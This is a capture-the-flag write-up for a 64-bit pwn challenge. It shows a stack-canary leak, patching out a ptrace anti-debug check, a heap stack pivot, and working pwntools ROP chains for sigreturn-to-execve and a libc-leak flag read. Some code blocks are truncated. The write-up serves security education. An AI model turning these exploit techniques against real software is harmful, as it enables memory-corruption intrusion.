# Name Tag (Pwn, 500 points, 1 solve)


> Welcome to Bsides Boston!!! We forgot to print name tags, can you fill one out?
> Note: Libc is NOT needed to solve this challenge.

First we do some static analysis on the binary to figure out what kind it is,
the protections it has, and a general understanding of the program.

```sh

$ pwn checksec name_tag
[*] '/home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ file name_tag
name_tag: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=da6ef25bae2ec5b2272517164cc5ac45d43c7f59, for GNU/Linux 3.2.0, not stripped
```

So we have a 64-bit binary with Parial RELRO, stack canaries, a non-executable
stack (NX), and is not a position independent executable (PIE). In practice this
means:
- Any overflow we would to do will also need to bypass the canary
- Return-oriented programming (ROP) will probably be required because of NX
- The executable and GOT is always in the same spot so we can use static
  addresses for locations of functions and gadgets.
- It could be a heap related exploit since we don't need to overflow canary
  for that.

Decompiling the binary with Ghidra and looking at the main function gives us the
following pseudocode, variables named by me for clarity when parsing it.

```c
undefined8 main(void)
{
  char *bio;
  long in_FS_OFFSET;
  char last_name [32];
  char first_name [40];
  long cookie;
  
  cookie = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  memset(last_name,0,0x20);
  memset(first_name,0,0x20);
  puts("\nWelcome to Bsides Boston!!!!!!!!\n");
  puts("In order for your name tag to be created you need to fill out some information.");
  printf("Can you please tell us your first name? ");
  readStr(first_name,64);
  printf("\nWelcome %s\n",first_name);
  puts("Can you please tell us a little about yourself?");
  printf("Bio: ");
  bio = (char *)malloc(512);
  readStr(bio,512);
  printf("Great!!!! Here\'s your name tag id: %d\n",bio);
  printf(
        "\nOh I almost forgot. Can you tell us your last name to finish up the name tag creationprocess? "
        );
  readStr(last_name,112);
  printTag(first_name,last_name,bio,0x20);
  if (cookie != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

So the program asks us for some user input (name, bio, last_name) and then
prints out some information related to it.

The first thing we notice is that there are 3 reads for our user input, where
two of them allow us to write outside of the allocated buffer. This is possible
with both the `first_name` and `last_name` reads.

We also see that the heap is used via the `malloc` call for the bio, but we
allocate and read in 512 bytes, so there isn't an overflow in the heap here.
It's also never `free`'d or used as a function pointer, so we can eliminate
heap exploits from out possible exploits.

The last thing is that we see an "ID" given for the bio which is printed
a decimal number of the pointer, so that is leaking the address of `bio` in the
heap.

So at this point we know the following:
- We can overflow `first_name` and `last_name` enough to overwrite the return
  pointer, but we still need to deal with the stack canary.
- The application leaks the heap address

## Dynamic Analysis (Bypassing Anti-Debugging)


Next let's move on dynamic analysis and see what we can find.

```sh
$ gdb -q ./name_tag
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./name_tag...
(No debugging symbols found in ./name_tag)
pwndbg> run
Starting program: /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag
[Inferior 1 (process 97856) exited normally]
```

We see that the program just exits when we try to debug it which isn't expected
since this is an interactive program. We can also run it through `ltrace` and
`strace` to get more information.

```sh
$ ltrace ./name_tag
_exit(0 <no return ...>
+++ exited (status 0) +++

$ strace ./name_tag
execve("./name_tag", ["./name_tag"], 0x7ffd0e5f33c0 /* 58 vars */) = 0
brk(NULL)                               = 0x988000

mmap(NULL, 93864, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f011f80b000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3

mmap(0x7f011f669000, 1355776, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7f011f669000

mprotect(0x7f011f7ff000, 12288, PROT_READ) = 0
mprotect(0x403000, 4096, PROT_READ)     = 0
mprotect(0x7f011f84c000, 4096, PROT_READ) = 0
munmap(0x7f011f80b000, 93864)           = 0
ptrace(PTRACE_TRACEME)                  = -1 EPERM (Operation not permitted)
exit_group(0)                           = ?
+++ exited with 0 +++
```

So `ltrace` shows us that it just exists and doesn't even try to run. `strace` 
has the standard setup but then has a `ptrace(PTRACE_TRACEME)` call returning
an error `EPERM (Operation not permitted)`. This is indicative of anti-debugging
protections on the binary. So if we want to continue digging in we'll need to
bypass this, we can do that by finding where this happens in the binary and
patch it to not.

Looking at the functions in Ghidra we can see an `init` function which has the
following assembly.

```
push   rbp
mov    rbp,rsp
sub    rsp,0x10
mov    rax,0x56
xor    rdi,rdi
xor    rsi,rsi
mov    rdx,0x1
xor    r10,r10
add    rax,0xe
add    rax,0x1
syscall
mov    DWORD PTR [rbp-0x4],eax
cmp    DWORD PTR [rbp-0x4],0xffffffff
jne    4015cf <init+0x3c>
mov    edi,0x0
call   401040 <_exit@plt>
nop
leave
ret
```

It's slightly obfuscated at exactly what's happening due to manipulating `rax`
in multiple instructions, but this turns out to be important for certain
exploits. Adding up `0x56 + 0xe + 0x1` is `101` in decimal, which is the
[`sys_ptrace` syscall](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/), 
so the binary self-traces itself which prevents debuggers from attaching and
inspecting what's going on. This is what we need to remove.

There are many ways you could do this, but the way I ended up was changing the
initial `mov rax, 0x56` instruction to a `mov rax, 0x57`. This has the effect of
changing the syscall to `sys_getuid` which doesn't take any arguments, so the
values of the other registers doesn't matter and this basically becomes a noop.
I used the hex editor in Binary Ninja to do this, but many tools will work here.
The new binary is saved as `name_tag-tracable` so we have the original and this
one around when we want to try against the real binary. 

Now that we can debug it, we can provide some input and take a look at the stack
to see what our options are. The disassembly above is actually slightly wrong,
first name is is also a 32-byte buffer, not 40. So let's max these buffers out
and take a look at the stack in GDB. 

```sh
$ gdb -q ./name_tag-traceable

Turning this into some ASCII here is our stack from top to bottom:
```
[ 8-bytes] 0
[ 8-bytes] bio pointer
[32-bytes] last name
[32-bytes] first name
[ 8-bytes] stack address pointing to the value 1 (not sure what this is used for)
[ 8-bytes] stack cookie
[ 8-bytes] saved RBP
[ 8-bytes] return pointer
```

When we read into these addresses out input starts at the beginning of each of 
these pointers and goes down. Recall that we can read up to `64` bytes into
first name, so we can overwrite up to the return pointer. We can read `112` into
which will overwrite first name but allow us to go an extra `16=112-64-32` bytes
which could be helpful.

# Bypassing the stack cookie

But our first goal is to defeat the stack cookie. Without this any overwrite we
do will just fail the stack cookie check and crash. The previous output actually
hinted at how we could do this. Did you notice that the printed last name
actually read past out input and into the first name?

This happened because it's printed with the `%s` format specifier which will
print out all bytes until a zero byte is encountered, and because of a flaw in
the `readStr` which doesn't enforce that what it reads ends in a zero byte,
`printf` continues reading until the first one it sees. We can leverage this
to leak the stack cookie so that we can overwrite the buffer and still provide
a valid stack cookie.

From running the program multiple times you'll see that the lowest byte of the
cookie is always 0. I suspect this is a protection against accidentally leaking
it via other mechanisms, but we can also use this property to get a valid cookie.
We want to overwrite the bytes before the cookie and the lowest byte of the
cookie with non-zero values so that it will read out the highest 7 bytes of the
cookie for us. Looking at the stack diagram above, we see we need to write 41
bytes to overflow into the cookie.

```

Since many of the bytes aren't printable it's hard to see exactly what we leaked
from the ASCII representation, but if you capture the output and print in bytes
you'll see that we leak from the start of our first name up to the saved base
pointer because the first zero byte is output. Constructing the payload on the
terminal and dumping into `hexdump` we can see this the bytes in printed in
little endian.

```sh
$ python3 -c 'print("A"*40+"B")' | ./name_tag-traceable | hexdump -C

*** stack smashing detected ***: terminated
...snip
```

We use the different 41st character to easily identify where the leak starts.
You can also notice that we get the "stack smashing detected" error meaning we
have overwritten the cookie as expected, but it's currently wrong. We'll fix
this later, but we know the cookie at this point because the lowest byte is
always 0 and that's the only one we overwrite, so if we set it back we have the
cookie. A bitwise and will take care of this for us `cookie &=
0xffffffffffffff00`.

With the cookie leaked we now have two writes left, 512 bytes to the heap and
112 to last name on the stack. The second write is the one we can leverage fix
the cookie before the function returns and start a ROP, but we are limited to
three 64-bit values due to the liit on the read. If we knew the libc it was
using we might be able to find a "one shot" gadget and return there but at this
point we don't and due to something we'll discuss later, this wouldn't work
anyways. But we do have the ability to write a lot of data to the heap, so
what if we could write a ROP chain there and use that? Well, we can! This is
a concept known as "stack pivoting" because we need to pivot the stack to
a different spot so that the ROP chain will continue reading our instructions.

Because the binary leaks where the heap is, we can write a ROP chain to heap and
then have our first ROP change the stack (aka RSP) to point to that location
instead. Becaue the heap is readable and writable this behaves basically the
same as the stack normally does. First we need to find a gadget to manipulate
RSP, so we find one with ropper.

```
name_tag[master*] $ ropper --file name_tag --search "pop rsp"
[INFO] Searching for gadgets: pop rsp
0x000000000040163d: pop rsp; pop r13; pop r14; pop r15; ret;
```

To recap the plan:
1. Leak the stack cookie via first_name
2. Write a ROP chain to the `bio` in the heap and get the address
3. Write the stack pivot ROP chain to the heap address

Looking at our previous stack chart again, our ROP payload for the stack pivot
is:

```
[72-bytes] padding
[ 8-bytes] leaked cookie & 0xffffffffffffff00
[ 8-bytes] heap address & 0xffffffffffffff00  # This makes it somewhat valid but isn't terribly important what this is set to
[ 8-bytes] pop rsp gadget
[ 8-bytes] heap address (new RSP)
```

With this we can successfully pivot the stack into the heap with a stage 2 ROP
chain. Now we need to decide what to do with it.

Our gadget will first do `pop r13; pop r14; pop r15; ret` so the first three
values need to be whatever we want in those registers, and after that our second
ROP begins. Since I don't use those registers I just set them to `1, 2, 3`
accordingly. From here we have 488-bytes of a ROP chain to use and need to
decide how to exploit it.

Early on I noticed the peculiar way of setting up `rax` for the ptrace syscall
and you can see that there is a gadget that does `add rax,0xe; add rax,0x1;
syscall` which if `rax` is 0 will set it to `15`, which is the system call for
`sigreturn`, which allows us to get full control of all of the registers. This
is a really powerful gadget and combined with the challenge description of
"Libc is not needed" seems like the intended path. With sigreturn exploits you
often call the `mprotect` syscall to make a section of memory executable to
bypass NX protections and then execute shellcode from it. I was initially going
to go down this route but decided that doing an `execve` syscall would be
easier, which turned out to be true, but also led to me not solving the
challenge during the CTF :(

At this point I'll branch this writeup into two sections because I have two
exploits, one that only works against the patched binary without ptrace and the
other against the real challenge but an unintended solution. I haven't written
up the official solution due to some extra complexities with doing it, but I'll
also include a brief summary of how that works too.

## Sigreturn to execve exploit

For this exploit our second rop chain will set up a sigreturn to the `execve`
syscall, providing `/bin/sh` as the argument to get a shell. *THIS ONLY WORKS ON
THE PATCHED BINARY.* I couldn't figure out why this wasn't working on the real
one during the CTF, but after talking with the author it seems the `ptrace` call
will trap `execve`'s with `SIGTRAP` so they just won't run which causes this, or
any exploit using execve to fail. Let's set up our ROP chain to do so.

The first thing we need is a pointer to a `/bin/sh` string. From pwntools we can
search the running binary to find if they left one for us. There's one in libc
which is normal, but since we don't know the libc we can't use that. So we'll
need to write it to a known location so we can provide the address when we do
the syscall. We can see which sections are writable in pwntools too.

```
pwndbg> search "/bin/sh"
libc-2.31.so    0x7ffff7f7a143 0x68732f6e69622f /* '/bin/sh' */
pwndbg> vmmap name_tag
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA

          0x401000           0x402000 r-xp     1000 1000   /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable
          0x402000           0x403000 r--p     1000 2000   /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable
          0x403000           0x404000 r--p     1000 2000   /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable
          0x404000           0x405000 rw-p     1000 3000   /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable
```

So we can write to the data section and since the binary does not use PIE this
is a static location we can reference. We do need to be a bit careful writing
here since it also houses data the program uses for various purposes, but since
our input is really short and we aren't returning back to the program we can
just write to the beginning.

After we read `/bin/sh` into that location we will want to clear out `rax` so
that when we return back to the sigreturn gadget `add rax,0xe; add rax,0x1; syscall`
it sets `rax` to 15 as we want to execute the sigreturn syscall. After some
gadget searching we find a gadget that can clear it for us:

```
name_tag[master*] $ ropper --file name_tag --search "mov eax"
[INFO] Searching for gadgets: mov eax
0x0000000000401279: mov eax, 0; pop rbp; ret;
```

At this point our chain is:
1. Read `/bin/sh` into known location
1. Clear `rax`
1. sigreturn sycall

The way that sigreturn works is that it reads the values of the stack after the
syscall and loads them into the appropriate registers and transfers execution
there. There are posts which go into the details of the structure, but we just
use the pwntools class to construct it for us. Our ROP payload we write to the
heap will look like this:

```python
bin_sh_addr = 0x404000
r = ROP(exe)
r.readStr(bin_sh_addr, 0xff)
r.raw(clear_eax)
r.raw(0) # pad because the clear_eax has an extra pop
r.raw(sigreturn)

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload = r.chain() + bytes(frame)
```

Putting all this together and summarizing, the exploit works as follows:
1. Leak stack cookie
2. Write read /bin/sh and sigreturn to execve to heap
3. Ovewrite stack cookie and return of main to pivot stack to heap and execute
   from there.
4. Profit.

## Ret-to-libc exploit

While the author didn't indend for a ret-to-libc exploit to work, I was able to
use the ROP to leak GOT addresses and found a database ((libc.rip)[http://libc.rip]) which told me the
version, so I could use the correct offsets and get the flag. We could use this
to do another `execve(`/bin/sh`, 0, 0)` but as I mentioned earlier we can't
actually run `execve` on the official binary due to the ptraceing. So we need to
try and open the file, read it, and then write it back to standard out.

So here is what we need to do:
1. Leak libc addresses from GOT to calculate libc base
2. Create a new ROP using these addresses to read the flag file and print it

My exploit might be a little more complicated than it needs to be, but this was
after working on this problem for many hours so I was braindead and I mean, it
works :) The complexity is that in the second ROP we actually set up for
a second stack pivot to a third ROP chain. I was running into some trouble with
overwriting too much of the data section causing the program to crash so
I wanted to get the heap address and be able to use that more, though the
exploit only ends up reading the flag into it which is pretty small. Okay, to
the exploit.

```python
# These were chosen by looking at the writable data section in the debugger to
# find spots that were mostly 0s so it wouldn't break things.
data_writable = 0x404f00
flag_addr = 0x404e00

r = ROP(exe)
# Print libc puts and malloc address from GOT.
r.puts(exe.got['puts'])
r.puts(exe.got['malloc'])
# Read the flag file name into one location and our next ROP into another
r.readStr(flag_addr, 0xff)
r.readStr(data_writable, 0xfff)
# Pivot the stack to where we are writing the next ROP
r.raw(pop_rsp) #  pop rsp; pop r13; pop r14; pop r15; ret;
r.raw(data_writable)
heap = do_rop(io, r.chain())
heap += 1024 # get our of the way of our previous writes (recall our first ROP started here)

# Parse the leaked address and calculate the base address. This was sometimes
# inconsistent, I asssume 0s in the addresses, which is why the length check is
# there.
io.recvuntil("Bio: ")
leaks = io.clean()[:-1].split(b"\n")
if len(leaks) < 3:
    return
puts_addr = int.from_bytes(leaks[-2], "little")
malloc_addr = int.from_bytes(leaks[-1], "little")
libc.address = puts_addr-libc.symbols['puts']

# Write flag file name to flag_addr
io.sendline("./flag.txt")

# Do the open/read/write ROP, ensuring to include libc in the ROP instance so
# it can find the right address.
r = ROP([exe, libc])
r.raw(1) #  r13-15 (for the rsp gadget used to pivot stack)
r.raw(2) #  r13-15
r.raw(3) #  r13-15
r.open(flag_addr, 0) # open with read permission
if args.LOCAL: # file descriptors experimentally chosen until it worked
    r.read(3, heap, 0xff)
else:
    r.read(6, heap, 0xff)
r.write(1, heap, 0xff) # write to stdout
io.sendline(r.chain())

# Retrieve the flag from stdout, getting rid of excess 0s printed.
dat = io.recv().replace(b"\x00", b"").decode()
if len(dat) > 0:
    print(dat)
```

## Intended exploit

I wasn't able to get the indended solution working myself, but after discussing
with the author can provide a summary of how it was expected to work. tldr is
that it uses the same stack cookie leak, pivoting and sigreturn, but you are
supposed to do the mprotect syscall and read shellcode to get the flag. There's
one big gotcha with just doing mprotect that I couldn't figure out when I was
trying it.

If you take my exploit for the sigreturn to execve it will just about work, but
you'll see if you change just rax to be `constants.SYS_mprotect` it will fail
pretty miserably with some confusing issues. After spending some time with it
I figured out the issue is that mprotect is syscall `10`, which is `0xa` in hex,
and a `\n` newline in ascii. The `readStr` call we are using to read input
breaks at `\n` so we end up with the excess bytes remaining on stdin for later
calls which ends up breaking our ROP. Ideally we could use another function out
of the PLT to read bytes that doesn't do this but nothing is available except
`getchar` and that would be a serious pain to read enough input with.

I tried various different ways of reading it with no success.
1. In multiple chunks to avoid the `0xa` but the reading doesn't add one so it's
   invalid
1. Use `memset` in ROP to set the byte directly, but there wasn't a `pop rdx`
   gadget which is needed to set the third arg.

The intended solution was to set it to `9` instead of `10` in the frame, and
then rather than setting `rip` directly to `syscall` in the sigreturn frame
(standard practice), you set it to an instruction before which does `add rax,
0x1; syscall`. So simple, just had to think a little bit more out of the box
than a "standard" exploit, very cool!

## Conclusion

This challenge was really fun and I learned so much along the way. It was well
made to force you down specific paths and had you tie a whole series of problems
together into an exploit, but forced you to think outside of the box to get
a solution. 

Great job to the author and organizers! I just wish it was a longer CTF so
I could have solved it during.
